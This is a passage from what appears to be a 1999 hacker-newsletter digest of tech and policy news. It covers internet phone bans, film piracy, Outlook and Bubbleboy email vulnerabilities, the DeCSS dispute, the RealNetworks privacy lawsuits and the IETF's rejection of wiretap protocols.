      weapons, and issues like money laundering, which Bangkok recently passed legislation to combat.
      
      He said locating the academy in Thailand showed the United States saw Thailand as "regional
      leader in terms of law enforcement" and praised its efforts in fighting narcotics. 
      
      Freeh spoke before heading to Seoul on the last leg of an Asian tour that has taken him to Japan,
      the Philippines, Singapore as well as Thailand -- all, like the United States, facing problems from
      abuse of methamphetamines. 
      
      He said it was up to producer countries, like Myanmar, to make "honest" and "sustained" efforts
      to combat the trade. 
      
      "But the real issue has to be addressed on the consumer demand level and the United States has
      to do a much better job with respect to that as we ask other countries to do their share."

      PTT Ministry bans overseas phone calls via Internet 

      Zayan Khalil Daily Star staff 

      The Ministry of Post and Telecommunications Saturday banned Internet 
      service providers from offering voice communication services. The service, 
      known as the Voice Over the Internet, provides Internet subscribers with a 
      cheap means of calling overseas.       Abdel-Monem Youssef, the ministrys 
      director-general of operations and maintenance, warned that Internet 
      service providers would be prosecuted if they failed to comply with the 
      terms and regulations of their licenses. The licenses, which were granted 
      by the ministry, instruct Internet companies to refrain from offering 
      voice services. Video conferencing was also prohibited. The ministry has 
      the exclusive right to provide international and local lines, Mr. Youssef 
      said. Internet companies that dont abide by the terms of their license 
      are reducing the ministrys revenues and depleting public funds. 
      Subscribers to the phone service make international calls from regular 
      land lines by dialing their Internet account number followed by the phone 
      number abroad. Unlike other Internet phone services, subscribers to the 
      Internet phone do not require a computer to place their calls, only a 
      regular phone. The cost is charged directly to the subscribers Internet 
      access account. Following the ministrys decision, Intracom Products 
      announced the suspension of its phone-via-Internet service. Intracom, one 
      of several companies that offered what it called the i-phone service, 
      launched a nation-wide advertising campaign a week ago to promote the new 
      product. An announcement on the companys website Sunday said, if you 
      have any remaining i-credits on your i-phone account, they will be 
      transferred in a few days to your Internet account. In a statement, the 
      company apologized to the ministry for any inconvenience caused by 
      offering the service. Bahjat Darwish, the general manager of IntraCom 
      Products, described his companys license breach as a misunderstanding 
      with the ministry but refused to elaborate. We understood the ministrys 
      directions in a different way than they did, said Mr. Darwish. But we 
      dont want to do anything that does not suit the ministry. However, the 
      decision does not affect a foreign phone over the Internet provider, 
      Net2-Phone Lebanon, which offers a similar service. Net2Phone is an agent 
      for US-based International Dealers for Telecommunication (IDT). It allows 
      customers to make telephone calls directly from their computers to regular 
      phone numbers all over the world for a fraction of the governments rates. 
      The service charges 15 cents a minute for a peak-time call to the U.S. and 
      10 cents at reduced rates, while the i-phone charged 65 cents. Making the 
      same call through the ministrys operator at the 100 number would cost up 
      to $1.40 a minute. But an expert in the information technology industry, 
      who refused to be named, predicted that the ministry would soon interfere 
      in the business of any company providing international calls via the 
      Internet. The ministry will always want to be the countrys only provider 
      of phone lines because it cannot do the same with data transfer, the 
      source said. Of Lebanons 10 current Internet service providers, only four 
      have access lines spread throughout the country. The service providers are 
      generating approximately $1m a month in revenues, thanks to growing 
      numbers of subscribers. According to ministry statistics, Lebanon has just 
      under half of the Arab worlds 85,000 Internet subscribers.

      copy and released on the Internet over a week before
      its official release.

      NOV 8 1999 

      007 film hijacked 

      A copy of the latest Bond movie, The World Is Not
      Enough, has been stolen before its official release
      on Nov 18, and is available free over the Internet

      LONDON -- The Internet bootleggers are more than a
      match for James Bond. 

      A copy of one of the most widely trailed blockbusters of
      the year -- the latest 007 movie, The World Is Not
      Enough -- has been stolen before its official release and
      is available free over the web, reported The Sunday
      Times. 

      The paper said investigators believed it was the first time
      a top movie had fallen victim to Internet thieves before
      reaching the cinemas. 

      Experts suspect the Internet version might have been
      copied from a trade tape sent across the Atlantic
      between film executives. 

      For movie studios, it is a nightmare come true. 

      George Lucas, producer of the Star Wars films, said he
      had believed the technology would not exist for several
      years, but Star Wars: the Phantom Menace was being
      downloaded on British computers within 24 hours of its
      American premiere and sold on videotape at street
      markets before it opened here. 

      At least Star Wars had a chance to make money before
      the thieves got hold of it, The Times said. The 19th
      Bond adventure is not due for release until Nov 18. 

      UPI, which paid millions to distribute it, launched an
      investigation last week to find out how a secretive film
      collectors' club got hold of the video-quality copy and
      put it on the Internet. 

      The Times said the theft was not for profit: Hackers
      prided themselves on distributing copies of movies,
      computer games and software before their official
      release. 

      Lavinia Carey, director-general of the British Video
      Association, said bootlegging was a 2-billion
      (S$5.5-billion) business. 

      In Malaysia, illicit copies outnumber originals by four to
      one. 

      Most film companies believe distribution of movies over
      the Internet is inevitable. 

      Microsoft is working on technology to allow films to be
      sent live into ordinary computers. 

      One expert quoted by The Times warned: "Once that
      technology is in place, it will be hijacked by the pirates.
      They are in it for the technical challenge rather than the
      money -- which is why not even James Bond can beat
      them."



      It'll take four days to download the movie

      COPY of the latest James Bond movie -- The World Is
      Not Enough -- was stolen by a secretive film collectors'
      club. 

      The video-quality copy was then put on the club's
      website on the Internet. 

      The Sunday Times of London said it took four days to
      download the movie into an ordinary computer. 

      But it added that users with ISDN telephone lines can
      make a copy overnight and then "burn" it onto a video
      CD, which can then be watched on any home computer.

      The website can be accessed only by people who are
      given its seven-digit address as a reward for supplying
      the club with early copies of films. 

      The site has been closed, but the film is still being
      duplicated. 

      The Times did not give the address of the website. 

      Audiences in Singapore and Malaysia will be the first in
      the world to see the movie, which will be released in the
      two countries on Nov 18, one day before its American
      release. 

      Mr Roger Pollock, managing director of United
      International Pictures, the film's distributor in Singapore,
      said last month: 

      "The reason Singapore and Malaysia are sharing the
      same release date is to cut down on the potential threat
      of video piracy."

      Outlook vulnerable to masquerade attack 
      By Stephen Shankland
      Staff Writer, CNET News.com
      November 8, 1999, 6:55 p.m. PT 
 
      A prominent computer "bug hunter" has found a vulnerability that allows a 
      malicious programmer to launch an email attack which bypasses some of the 
      precautions built into Microsoft's Outlook software.

      The vulnerability smoothes the way for a new type of email-borne virus, 
      also called a Trojan horse, and other malicious software. Microsoft 
      Outlook is one of the most popular email programs in use.

      Ordinarily, when a Microsoft Outlook user clicks on a file that has been 
      received as an "attachment," the program will ask whether the user wants 
      to open or save the attachment. Programs which exploit the vulnerability, 
      however,       fool Outlook into executing the potentially harmful 
      software without asking permission.

      Email containing a malicious payload is a popular new method of attacking 
      computers. For example, US West's internal network had to be shut down for 
      an evening about two weeks ago because of a self-generating attack.

      The attack works by disguising the true identity of an email attachment so 
      that Outlook assumes the attached file is benign, said the discoverer, 
      Juan Carlos Garcia Cuartango, a Spanish researcher       who has found 
      several other weaknesses in the past. The masquerade works because Outlook 
      doesn't examine files with common "extensions." An extension is a 
      three-letter filename suffix, such as "doc" or "gif."

      "Outlook does not care about what the real attachment contains. It only 
      cares about the attached file suffix," Cuartango said in an email.

      Microsoft was unable to comment on the vulnerability by press time.

      The newly discovered problem affects Microsoft Outlook Express 4 and 5, 
      Outlook 98, and Outlook 2000, according to Elias Levy, chief technology 
      officer of Security Focus, a company that monitors computer security 
      problems. There aren't yet reports of active attacks using the 
      vulnerability, he said.

      "I think it's very severe," Levy said. "It could be used to create 
      something just as bad or even worse than Melissa," he said, speaking of a 
      virus that swept the Internet in March.

      Melissa was successful largely because it automatically sent copies of 
      itself to unsuspecting users via Microsoft Outlook email software. 
      Antivirus software initially failed to detect the virus, although Melissa 
      ultimately proved a bonanza for antivirus companies.

      Since its emergence, several other variants have appeared on scene. 
      Cuartango said he notified Microsoft of the vulnerability on October 15.

      The basic problem isn't being fixed by companies such as Microsoft and 
      Netscape, Levy believes.

      "Cuartango and [fellow bug catcher Georgi] Guninski have shown we just 
      have this cycle. They find a bug, the vendor patches it, a week goes by, 
      and they find another one," Levy said. "We have to look beyond that at 
      what's       fundamentally wrong here: We have programs such as Web 
      browsers and email clients that connect to an untrusted network from which 
      they receive data they do not trust."

      Levy believes the solution is to adopt a method used by the military, in 
      which programs run in a safe zone within a computer--a cordoned-off area 
      where the programs have minimum privileges and can't do any damage. Sun       
      Microsystems has taken steps in this direction with its "sandbox" area, 
      Levy said, but there still is room for attacks that don't use Java and 
      companies have had some difficulties in making sure Java works like it's 
      supposed to.

      The Unix operating system, which is supposed to restrict the actions of 
      computer tasks not run by the system administrator, is better than 
      Windows, Levy said. However, it's "definitely not the solution either."

      The new vulnerability works through a series of disguises, Levy said. 
      First, the malicious program is converted into a Microsoft archive format 
      called a "cab" file. Then, the cab file is renamed with an extension of a 
      file type that       Outlook isn't concerned with (such as "jpg," "mov," 
      or "txt"), then emailed as an attachment. 

      When the victim clicks on the attachment, the cab file is decompressed and 
      its contents saved to a specific location. The last stage occurs when a 
      Javascript program in the email then can execute the potentially malicious       
      program that was contained in the cab file.

      To protect against the problem, Security Focus recommends changing the 
      default location for temporary files from TEMP or TMP to some other, 
      unpredictable location. "You can also disable Javascript," the company 
      said.

      The Fed's Deadbeat Database 
      by Declan McCullagh 
      
      4:00 p.m. 9.Nov.1999 PST A vast federal database will be used to identify 
      Americans who default on student loans or who should not be receiving 
      unemployment benefits, according to a bill scheduled for debate Wednesday 
      by the US House of Representatives. 

      The measure would require the Department of Health and Human Services to 
      use a national list of current public and private-sector employees to 
      track people suspected of cheating the government out of money. 

            
      The American Civil Liberties Union and some conservative groups are trying 
      to rally last-minute opposition to the measure, which proponents say would 
      reduce fraud by as much as US$800 million a year. 

      "This legislation would help turn employers' gates into government 
      checkpoints: Today the check is whether they owe child support. Tomorrow 
      the check is whether they can collect workman's comp. In the future the 
      check could be       even more intrusive," says Greg Nojeim, ACLU 
      legislative counsel. 

      As part of a sweeping 1996 welfare reform law, Congress created the 
      "Deadbeat Dad" database to track fathers who did not pay child support. 
      Beginning in 1997, it required HHS to set up a computer system to record 
      names, Social       Security numbers, birthdates, and employers. 

      Phyllis Schlafly's Eagle Forum says it hopes to defeat the "Fathers Count 
      Act", which is sponsored by Representative Nancy Johnson (R-Connecticut) 
      and expands the use of the database. 

      "We're opposed to expanding the use for any reason. When it was created we 
      were told it would only be used for the purpose of tracking deadbeat 
      dads," said the Eagle Forum's Lori Cole. 

      The bill is designed to thwart "borrowers of loans made under title IV of 
      the Higher Education Act of 1965 that are in default" or owe other grant 
      money. It says information will be turned over to the Department of 
      Education and       Justice Department prosecutors. 

      State unemployment agencies may submit a name and SSN to check if that 
      person receiving benefits is employed or not. 

      Under existing law, the Social Security Administration verifies that correct
      SSNs are listed in the database. The Treasury Department and the IRS also 
      have full access.

      Carnegie Mellon University (CMU) disconnected the dorm
      room access of 71 students after the systems where
      scanned and found to have MP3 files on them. CMU
      claims they where pressured into the scan by RIAA
      (Recording Industry Association of America), who denies
      the accusation. Details are sketchy as to how the
      school actually performed the scan or if they illegally
      broke into the systems to gather the information. No
      warnings about the search was given to students which
      may have violated the Digital Millennium Copyright Act
      of 1998. It is unclear whether the school verified the
      legal status of each MP3 file. Some students had posted
      their own music and not pirated materials. (If this was
      done by a simple web crawler a robot.txt file should
      take care of it.)

34.0  New Privacy Alerting Software

      "Enonymous Advisor" is a free internet utility that kicks
      in when a one opens a web page that requests personal
      information. It shows the web site's rating, which is
      based on Enonymous' evaluation of the site's privacy
      policies, with regards to consumer privacy. (Big whoop.
      The problem is that there are no laws. Companies are
      free to write one thing in the policy and then do
      another, or change the policy at anytime without
      notifying users.)

      FYI: New firm offers privacy alerts

      Enonymous.com wants to give Web surfers a more complete picture of exactly 
      how sites that collect data from users plan to use their names, e-mail 
      addresses and any other data they collect.

      The company is distributing a free Internet utility called Enonymous 
      Advisor. A computer equipped with the Advisor, which can be downloaded 
      from http://www.enonymous.com , detects sites that request personal 
      information. When a fill-in-the-blank form is opened on a user's Web 
      browser, a window pops up with information about how the site rates on 
      consumer privacy. The ratings are based on Enonymous' evaluation of the 
      site's privacy policies.

      Amazon.com, Yahoo.com and Expedia.com are among about two dozen sites 
      receiving one star each -- the lowest rank, which means that the site may 
      share personal data without permission. The maximum rating is four stars.

      For example, Amazon.com's privacy policy states that it "does not sell, 
      trade, or rent your personal information to others," but adds, "We may 
      choose to do so in the future with trustworthy third parties, but you can 
      tell us not to by sending a blank e-mail message to never@amazon.com.'';

      Amazon spokesman Paul Capelli said, "I think our policy is clearly 
      defined, and that our customers are comfortable with it."

      Enonymous.com awarded four stars to sites such as eBay.com, AOL.com and 
      Hotmail.com, which share users' information only with their permission and 
      will contact them, via e-mail or otherwise, only with their permission.

      In the next year Enonymous plans to create the online equivalent of 
      anonymous post-office boxes for people who want to receive ads without 
      giving out their e-mail addresses.

      Australia's largest ISP, Cable and Wireless Optus,
      suffered what they called "an unauthorized intrusion"
      and proceeded to file charges against seven people who
      had viewed user names and passwords on their site.
      The Web surfers claimed that there was no intrusion
      and that they had accidentally stumbled across an
      insecure web page. A page that had been left available
      to the public since last February.

      Optus drops legal action against hackers 
      
 
      One of Australia's largest Internet Service Providers
      has dropped legal action against a small group of its
      users who stumbled onto a site that detailed all the
      passwords of the company's clients.
 
      Cable and Wireless Optus launched the legal action
      against seven people, including an international-level
      tennis umpire and students studying for their HSC.
 
      The company described the discovery last week as "an
      unauthorised intrusion", but the defendants say they
      were just web surfers who stumbled across an
      unsecured web page.
 
      They say the file listing the password in plain text had
      been available to anyone with a web browser since
      February, and the discovery was not part of a "hack" of
      the Optus system.
 
      The company, which operates the Optusnet, Microplex
      and DingoBlue services, today dropped legal action
      against two of the defendants, and says it will be
      seeking agreement with the other five to do the same.
 
      The terms of the settlement remain confidential, but
      they do not include compensation to the defendants
      who had their Internet accounts blocked and, in some
      cases, their computers siezed.
 
      The company concedes that the legal action, and the
      lack of security on the password site, were not good
      publicity, but says other customers would feel grateful
      for the company's actions.
 
      A spokeswoman says customers' piece of mind is the
      major concern with any form of intrusion, and she is
      confident the company had done the 'right thing', even
      though some observers see the actions as
      heavy-handed.

      New, fast-spreading email virus found By John Borland Staff Writer, CNET 
      News.com November 9, 1999, 3:15 p.m. PT 

      update A virulent new kind of computer virus triggered simply by opening 
      an infected email message has been identified, antivirus researchers said 
      today. 

      The virus, dubbed "Bubbleboy," apparently hasn't yet made it onto the open 
      Internet, which means researchers haven't heard of any computers being 
      infected. But a version of the program was mailed anonymously to 
      researchers       last night, indicating a high potential for future 
      infections. 

      The virus strikes a Seinfeld theme, changing the victim's computer's 
      registered owner to "Bubbleboy," a reference to an episode of the former 
      popular TV show. There are other references to the show       in the 
      program: Users' company information is changed to "Vandelay Industries," 
      and "Soup Nazi" also appears in the source code. 

      It appears in mailboxes with a subject line "Bubbleboy is back," 
      researchers said.       The virus marks a dangerous step forward in the 
      trend of using email to attack remote computers, researchers say. As with 
      several earlier similar fast-spreading viruses, it takes advantage of 
      security holes in Microsoft Outlook email software to run an unauthorized 
      program on victims' computers, changing information and emailing itself to 
      new targets. 

      Those viruses need a user to click on an email "attachment" in order to be 
      triggered, however. By contrast, Bubbleboy runs as soon as an Outlook user 
      opens an infected email, or even when an       Outlook Express user 
      previews a message. 

      "If this got into the wild, it would spread incredibly quickly," said Dan 
      Schrader, an antivirus researcher with Trend Micro. "This would make 
      Melissa look slow." 

      Melissa was successful largely because it automatically sent copies of 
      itself to unsuspecting users via Outlook. Antivirus software initially 
      failed to detect the virus, although Melissa ultimately proved       a 
      financial bonanza for antivirus companies. Fears of an even more quickly 
      spreading threat could prompt another surge in antivirus software sales. 

      The new virus requires a user to be running Microsoft's Outlook email 
      program, Windows 95, 98, or 2000, and Internet Explorer 5.0 or higher. It 
      targets a security hole for which Microsoft has already       created a 
      fix, but which many users still have yet to use, researchers say. 

      Microsoft did not have a comment on the virus by press time. 

      The development marks a dangerous--if widely predicted--step in virus 
      technology, researchers say. Nevertheless, Bubbleboy itself is relatively 
      benign, aside from its mass email effects. 

      But more malicious programs, carrying effects such as deleting files or 
      programs from a victim's computer, could also theoretically be included in 
      this kind of virus. 

      This style of virus could also be used for more targeted attacks, 
      researchers said. This could include sending programs designed to do 
      specific tasks--such as emailing the contents of an inbox to a       third 
      party--to a specific individual. 

      "We used to say that as long as you didn't open an email attachment from 
      someone you don't know, you were fine," said Sal Viveros, group marketing 
      manager for the antivirus division of Network       Associates. "Now we've 
      come to the point where you must use antivirus protection if you're going 
      to use email." 

      The patch provided by Microsoft will protect users from this version of 
      Bubbleboy. Antivirus software that scans emails as they come through an 
      ISP or corporate network will also stop the program,       as soon as the 
      antivirus companies finish their analysis and update their programs with a 
      filter. 

      Researchers at Network Associates say they suspect the same author who 
      created the recent VBS.Freelink attack. Viveros said his company notified 
      Microsoft and the Federal Bureau of       Investigation last night.

      The companies stress that it is still a potential, rather than an 
      imminent, threat. 

      "We have not seen any instances of infection at all," Trend Micro's 
      Schrader said. "This is not something that people should be panicking 
      over. But it is kind of scary."

      DVD Hackers Headed to Court? 
      by Declan McCullagh 
      
      3:00 a.m. 10.Nov.1999 PST 
      If there's one thing entertainment industry lawyers don't like, it's someone
      copying CDs or DVDs. 
      
      But what they really, truly detest are the upstart hackers who discovered 
      how to copy DVD films -- and had the temerity to distribute a program that 
      does just that. 

            
      Motion picture industry lawyers have reportedly contacted at least two 
      programmers involved in developing the DeCSS utility and asked them to 
      delete information from their Web sites. 

      One of the members of the Norwegian group "Masters of Reverse Engineering" 
      said an Oslo attorney from Simonsen and Musæus, representing the movie 
      industry, has demanded that he remove a link to DeCSS from his Web site. 

      "I know very well that they would not win in court, but they could make a 
      big mess out of it. I simply do not have the time, nor money, to go up 
      against these people," Jon Johansen announced in a letter he posted online 
      Tuesday. He       said he decided to yank the link. 

      DVD's security system was intended to be hacker-proof, but MoRE recently 
      figured out how to circumvent it -- a move that could open up illicit 
      trading of digital movies and could cost the entertainment industry 
      millions of dollars. 

      The program, a tiny utility called DeCSS, allows knowledgable users to 
      copy any DVD movie to a .VOB file that ranges between 4.7 and 9.4 GB. 

      Just in case the lawyers get even nastier, the Linux community has a 
      not-so-secret weapon: Mirror sites. By late Tuesday, over a dozen 
      activists had placed copies of DeCSS online, and an index site includes 
      links to all of them. 

      In a post to a Linux-DVD mailing list Tuesday, Derek Fawcus disclaimed all 
      responsibility for the project. 

      "I will have nothing to do with work on DeCSS. If there is any work that I 
      may be considered to have ownership of, I give up all rights to that 
      work," he wrote. 

      Fawcus told Wired News last week that he had rewritten some of the DVD 
      decoder assembler code in the C programming language, and that code was 
      later used in DeCSS. 

      Fawcus wrote in a message last Friday that "the legal side has started" 
      and said that he had been accused of violating a 1998 UK copyright act. 

      That law restricts anyone who "publishes information intended to enable or 
      assist persons to circumvent that form of copy protection." 

      While the US Constitution's First Amendment would probably make such a law 
      in America unenforceable, Congress is debating a controversial 
      anti-circumvention law that would prevent people from decoding or removing 
      security from       files and bypassing the rights of copyright owners. 

      Industry groups could not be reached Tuesday for comment. But the Japan-based
      DVD Forum recently issued a statement condemning the Linux hackers' exploits 
      as "illegal and inappropriate."

      NOTE (Thu, Nov 11, 12:17pm EST): I've recently been informed that a law firm 
      which is likely to be one that would try get these mirrors taken down has been
      visiting this mirror site as well as others. With that said, there is a possibility
      that I may have to remove this site in the near future because like everyone else,
      I can't afford to go to court to fight it. Luckly, it seems fairly unlikely that 
      any law firm will ever be able to get rid of all these mirrors at this point (there
      are currently 41 in 8 different countries and this list is growing every day). However,
      I have only seen very few mirror _lists_ like this one anyplace. If anyone has the 
      resources, it might be wise to mirror this list of mirrors as well so that the right
      people will still know that these mirrors exist.

      DVD encryption break is a good thing
      By Bruce Schneier, ZDNN
      November 11, 1999 9:23 AM PT
      URL: http://www.zdnet.com/zdnn/stories/comment/0,5859,2391975,00.html
      
      The scheme to protect DVDs has been broken. There are now freeware programs on the Internet
      that remove the copy protection on DVDs, allowing them to be played, edited, and copied
      without restriction. 
      
      This should be no surprise to anyone, least of all to the entertainment industry. 
      
      The protection scheme is obviously flawed in several ways. Each DVD is encrypted with
      something called Content Scrambling System (CCS). It has a 40-bit key. (I have no idea why.
      The NSA and the FBI don't care about DVD encryption. There aren't any terrorist movies they
      need to be able to watch.) It's not even a very good algorithm. But even if the encryption were
      triple-DES, ths scheme would be flawed. 
      
      Every DVD player, including hardware consoles that plug into your television and software players
      that you can download to your computer, has its own unique unlock key. This key is used to
      unlock the encryption key on the DVD. Every DVD has 400 copies of the same decryption key,
      each encrypted with every unlock code. Note the global secret: if you manage to get one unlock
      key, you can decrypt every DVD. 
      
      But even if this were all perfect, the scheme could never work. The software player eventually gets
      the decryption key, decrypts the DVD, and displays it on the screen. That decrypted DVD data is
      on the computer. It has to be; there's no other way to display it on the screen. No matter how
      good the encryption scheme is, the DVD data is available in plaintext to anyone who can write a
      computer program to take it. 
      
      And so is the decryption key. The computer has to decrypt the DVD. The decryption key has to
      be in the computer. So the decryption key is available, in the clear, to anyone who knows where
      to look. 
      
      The DVD software manufacturers were supposed to disguise the decryption program, and the
      playing program, using some sort of software obfuscation techniques. These techniques have never
      worked for very long; they only seem to force hackers to spend a couple of extra weeks figuring
      out how the software works. I've written about this previously in relation to software copy
      protection; you can't obfuscate software. 
      
      It might be a bitter pill for the entertainment industry to swallow, but software content protection
      does not work. It cannot work. You can distribute encrypted content, but in order for it to be
      read, viewed, or listened to, it must be turned into plaintext. If it must be turned into plaintext, the
      computer must have a copy of the key and the algorithm to turn it into plaintext. A clever enough
      hacker with good enough debugging tools will always be able to reverse-engineer the algorithm,
      get the key, or just capture the plaintext after decryption. And he can write a software program
      that allows others to do it automatically. This cannot be stopped. 
      
      If you have secure hardware, you can prevent it. The attack works because the hacker can run a
      debugger and other programming tools. If the decryption device and the viewing device (it must be
      both) is inside a tamperproof piece of hardware, the hacker is stuck. He can't reverse-engineer
      anything. But tamperproof hardware is largely a myth, so in reality this would just be another
      barrier that someone will eventually overcome. 
      
      One more lesson, and an observation. 
      
      The lesson: This is yet another example of an industry meeting in secret and designing a proprietary
      encryption algorithm that ends up being embarrassingly weak. I never understand why people
      don't use free, public, encryption algorithms. They're almost always better. 
      
      The observation: One solution that the entertainment industry has been pushing for is to make
      reverse-engineering illegal. They managed in the United States: the Digital Millennium Copyright
      Act includes provisions to this effect, despite the protests of the scientific and civil rights
      communities. (Yes, you can go to jail for possessing a debugger.) This "solution" does not work
      and makes no sense. 
      
      First, unless reverse-engineering is illegal everywhere on the planet, someone will be able to do it
      somewhere. And one person is all you need; he can write software that everyone else uses.
      Second, the reverse-engineer can--like in this case--work anonymously. Laws wouldn't have
      helped in this case. And third, laws can't put the cat back into the bag. Even if you could catch and
      prosecute the hackers who did this, it wouldn't affect the hacker tools that have already, and
      continue to be, written. 
      
      The fatal flaw is that the entertainment industry is lazy, and are attempting to find a technological
      solution to what is a legal problem. It is illegal to steal copyrights and trademarks, whether it is a
      DVD movie, a magazine image, a Ralph Lauren shirt, or a Louis Vitton handbag. This legal
      protection still exists, and is still strong. For some reason the entertainment industry has decided
      that it has a legal right to the protection of its technology, and that makes no sense. 
      
      This DVD break is a good thing. It serves no one's interests for the entertainment industry to put
      their faith in a bad security system. It is good research, illustrating how bad the encryption
      algorithm is and how poorly thought out the security model is. What is learned here can be applied
      to making future systems stronger.

39.0  Class Action Suits Brought Against RealNetworks 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/

      contributed by Weld Pond And Lamer 
      Two class action law suits, one in Pennsylvania and
      another in California, have been filed against
      RealNetworks. The suits allege that RealNetworks
      invaded users privacy by collecting information about
      them without their knowledge when they used
      RealJukebox. Such collection of data allegedly violates
      the federal Computer Fraud and Abuse Act as well as
      California business statutes. The California lawsuit
      reportedly seeks compensatory and punitive damages of
      $500 per user.

      RealNetworks in Real Trouble 
      Wired News Report 
      
      9:15 a.m. 10.Nov.1999 PST Internet music consumers took RealNetworks to 
      court Wednesday over recently discovered user-tracking behavior in the 
      company's Internet music software. 

      In a class-action suit filed in the Federal District Court for the Eastern 
      District of Pennsylvania, the plaintiffs charged that RealNetworks 
      violated federal and state law by misrepresenting the use and collection 
      of personal data by users       of the RealJukebox software. 

            
      "This action is being filed on behalf of the millions of users of the 
      RealJukebox software to obtain compensation and other relief for the 
      violations of federal and state law alleged in the complaint," said 
      Jonathan Shub, a member of law Pennsylvania law firm Sheller, Ludwig & 
      Badey, in a statement. "RealNetworks must be held accountable for its 
      conduct." 

      The suit accuses RealNetworks of assigning a GUID (global unique 
      identifier) to each RealJukebox user without the user's knowledge, then 
      compiling information about people's music-listening habits. 

      RealNetworks violated the federal Computer Fraud and Abuse Act as well as 
      state privacy laws and consumer protection statutes, according to the 
      complaint. 

      The action is similar to a suit filed last week in California against 
      RealNetworks for invasion of privacy, trespass, and unfair competition. 

      The Pennsylvania plaintiffs want refunds for the software, and want 
      RealNetworks to provide access to the information that it collected. The 
      suit also asks the company to publish a remediation plan on its Web site. 

      The suits came following the recent discovery that as users listened to 
      Internet music, the RealJukebox software was transmitting detailed user 
      data back to the company.

      Jeffrey Wilens wants RealNetworks to face the music,
      and he has gone to court in Santa Ana, California to
      make them do so.
 
      According to the class-action lawsuit filed in the Orange
      County Superior Court, Wilens, an attorney who
      practices consumer protection law, alleges that
      RealNetworks violated California business statutes
      (Business & Professions Code, 17200, et seq.) when it
      failed to pay users of RealJukebox the market value of
      the information it captured, or uploaded, from their
      computers.
 
      RealNetworks has previously admitted that its
      RealJukebox assigned a personal ID number to users
      and uploaded information about their listening habits to
      its servers.
 
      However, the company also released a patch to disable
      the ID number, and said that it used the data only for
      personalising the service and never sold it to third
      parties.
 
      Mr Wilens is reported in InternetNews as having
      compared RealNetwork's actions in acquiring the
      information as the equivalent of home burglary. The
      lawsuit reportedly seeks compensatory and punitive
      damages of $500 per user in the State of California.
 
      When extrapolated out, total damages, if Mr Wilens is
      successful, could reach US$500 million based on his
      estimate that one million of the more than 16 million
      RealJukebox users reside in California.
 
      Jeffrey Spencer, the attorney handling Mr Wilen's' case,
      said that the $550 per user figure was a "floor" figure as
      to the amount of damages, and that further discovery
      into RealNetworks actions could significantly raise the
      amount of individual damages sought.
 
      Punitive damages are being asked because it is alleged
      that the statements RealNetworks had made to
      consumers about use of their personal information were
      misleading.
 
      Mr Spenser also said that his client would not have used
      RealJukebox if he had known that the Web site had the
      technology of collecting an extensive amount of personal
      data.
 
      Mr Spencer said: "If they weren't using the information,
      why were they collecting it?"
 
      He indicated that he wants to find out exactly what uses
      were made of the information.

40.0  IETF Rejects Internet Wiretapping Proposals 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/

      contributed by The Seventh Sign 
      The Internet Engineering Task Force, the ad-hoc group
      that decides Internet standards, has categorically
      rejected the idea of internet wiretaps. Of course
      companies that make routers and other hardware are
      still required to include legal wiretap capabilities into
      their products.

      IETF Says 'No Way' to Net Taps 
      by Declan McCullagh 
      
      3:00 a.m. 11.Nov.1999 PST WASHINGTON -- The Internet's standards-setting 
      body has decisively rejected the idea of Net wiretaps. 

      Members attending the Internet Engineering Task Force's meeting decided 
      overwhelmingly on Wednesday not to provide wiretap capabilities for 
      governments that want to conduct surveillance online. 

            
      After a surprisingly polite debate that lasted about an hour, fewer than 
      25 attendees of the roughly 800-person audience voted for the proposal. 
      Hundreds raised their hands to object to it, while dozens abstained. 

      One common complaint was that inserting wiretap functionality into 
      standards makes them less secure, something the IETF has long opposed. 

      "It would be like having the Christian Coalition debating a protocol for 
      third-trimester abortions," said Phill Hallam-Baker, a networking security 
      expert. 

      Many governments, including the United States, require telephone companies 
      to configure their networks so police can easily wiretap calls. As more 
      phone calls flow through the Internet, the FBI has asked the IETF to 
      consider allowing       similar lawful surveillance. 

      But the libertarian-leaning attendees would have none of it. 

      "This is not an area the IETF should be getting into," said Robert 
      Moskowitz, the former chairman of an IETF security working group. "This is 
      something that cannot be done right." 

      Two of the few people who spoke in favor of the concept came from Cisco, a 
      company that could be required to support wiretapping -- whether or not 
      the IETF makes the feature easy to implement. 

      "I'm a little concerned about [this anti-wiretap sentiment]. Clearly not 
      all wiretapping is illegitimate," one Cisco engineer said. 

      "It is legal. It is the law. Most of our customers already require it," 
      said Brian Rosen of Fore Systems, which builds networking hardware. 

      "We're going to take a protocol that is designed here and we're going to 
      modify it. I assure you that a very large number of [companies] will 
      implement the one with the tap," he said.

      The Internet Engineering Steering Group and the Internet Architecture 
      Board will publish a formal IETF position paper based on the rough 
      consensus of the audience and the views expressed during the debate. 

      "It is the first round in what will prove to be a very long-running debate.
      It's a good starting point," said Jim Dempsey of the Center for Democracy 
      and Technology.

      Just Say No to Wiretap Protocols 
      
      Internet group IETF rejects Net-watching as "repugnant," but wiretapping 
      protocols already proliferate.

      by Margret Johnston, IDG News Service       November 12, 1999, 12:05 a.m. 
      PT 

      Should protocols be designed to help law enforcement officials wiretap the 
      Internet? Members of the Internet Engineering Task Force, or IETF, say no. 
      In an informal vote Wednesday night, the group overwhelmingly rejected 
      adding protocols to support such action. 

      The vote came as a show of hands at the end of a discussion during a 
      plenary meeting attended by about 2000 of the worldwide standards-setting 
      body who have been meeting in Washington, D.C. all week.

      The majority opinion may be clear. But the poll resolved only the 
      political part of the debate, leaving the technical issues unanswered, 
      according to the head of the task force.

      "Clearly, there was a majority who found the concept of wiretapping 
      repugnant," says Fred Baker, chairman of the IETF. But the IETF recognizes 
      that existing protocol features used commercially, such as conference call 
      bridges, could also be used by law enforcement for       wiretapping, 
      Baker says. 

      Members present did not agree that current U.S. law requires creating a 
      protocol designed for wiretapping. But the FBI's interpretation is clear: 
      engineers designing the protocols must build in wiretapping capability, 
      according to Barry Smith, an agent at the FBI's Digital       Telephony 
      and Encryption Policy unit.

      One reason is the Communications Assistance for Law Enforcement Act of 
      1994, which requires carriers to use systems that include wiretap 
      capability. The act doesn't cover the Internet, but its reach is blurred 
      as voice telephony moves to the Internet. 

      Privacy Groups Lobby

      Members who participated in Wednesday night's discussion also expressed a 
      range of opinions, often disagreeing with each other. One speaker declared 
      designing protocols to assist wiretapping is "beyond state of the art" 
      now. Another said whatever the IETF does could       become irrelevant 
      anyway if appealed to the Federal Communications Commission.

